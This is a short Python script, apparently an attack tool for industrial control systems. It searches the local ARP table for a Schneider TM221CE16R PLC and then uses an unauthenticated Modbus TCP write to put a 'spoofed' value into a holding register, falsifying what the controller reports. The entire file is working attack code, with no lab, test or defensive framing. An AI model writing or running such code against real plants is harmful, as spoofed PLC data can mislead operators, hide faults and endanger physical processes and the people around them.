import socket
import subprocess
import pymodbus
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Use ARP scan to find devices on the network
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'TM221CE16R' in line:
            ip_address = line.split()[0]
            return ip_address
    return None

# Function to spoof reporting messages
def spoof_reporting_message(plc_ip, register_address, value):
    try:
        client = ModbusTcpClient(plc_ip)
        client.connect()
        
        # Write the spoofed value to the specified register
        result = client.write_register(register_address, value)
        
        if result.isError():
            print(f"Failed to write to register {register_address} on PLC at {plc_ip}")
        else:
            print(f"Successfully spoofed reporting message to register {register_address} with value {value}")
        
        client.close()
    except ConnectionException as e:
        print(f"Connection error: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC not found on the network.")
        return
    
    print(f"PLC found at IP address: {plc_ip}")
    
    # Define the register address and the spoofed value
    register_address = 0x0001  # Example register address
    spoofed_value = 12345      # Example spoofed value
    
    # Spoof the reporting message
    spoof_reporting_message(plc_ip, register_address, spoofed_value)

if __name__ == "__main__":
    main()